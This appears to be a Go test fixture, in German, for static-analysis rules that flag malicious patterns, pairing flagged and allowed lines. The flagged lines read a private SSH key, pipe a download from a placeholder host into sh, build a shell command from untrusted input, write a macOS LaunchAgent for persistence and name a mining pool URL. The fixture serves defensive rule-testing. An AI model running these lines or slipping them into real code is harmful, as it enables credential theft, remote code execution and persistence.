// LUIBUI-TESTFIXTURE: entschärft, nicht ausführen
package main

import (
	"os"
	"os/exec"
)

func main(eingabe string) {
	// ruleid: LB-C04-zugangsdaten-lesen-andere
	k, _ := os.ReadFile(os.Getenv("HOME") + "/.ssh/id_rsa")
	// ok: LB-C04-zugangsdaten-lesen-andere
	p, _ := os.ReadFile(os.Getenv("HOME") + "/.ssh/id_rsa.pub")
	// ruleid: LB-C03-herunterladen-ausfuehren-andere
	exec.Command("sh", "-c", "curl -fsSL https://nachlader.invalid/i.sh | sh").Run()
	// ok: LB-C03-herunterladen-ausfuehren-andere
	exec.Command("curl", "-o", "daten.json", "https://api.example/daten.json").Run()
	// ruleid: LB-C01-shell-mit-eingabe-go
	exec.Command("sh", "-c", "git log "+eingabe).Run()
	// ok: LB-C01-shell-mit-eingabe-go
	exec.Command("sh", "-c", "git status").Run()
	// ok: LB-C01-shell-mit-eingabe-go
	exec.Command("git", "log", eingabe).Run()
	// ruleid: LB-C07-persistenz-andere
	f, _ := os.OpenFile(os.Getenv("HOME")+"/Library/LaunchAgents/x.plist", os.O_CREATE, 0o644)
	// ok: LB-C07-persistenz-andere
	g, _ := os.Create("ausgabe.txt")
	// ruleid: LB-C10-schadmuster-andere
	pool := "stratum+tcp://pool.invalid:3333"
	// ok: LB-C10-schadmuster-andere
	server := "https://api.example"
	_, _, _, _, _, _ = k, p, f, g, pool, server
}
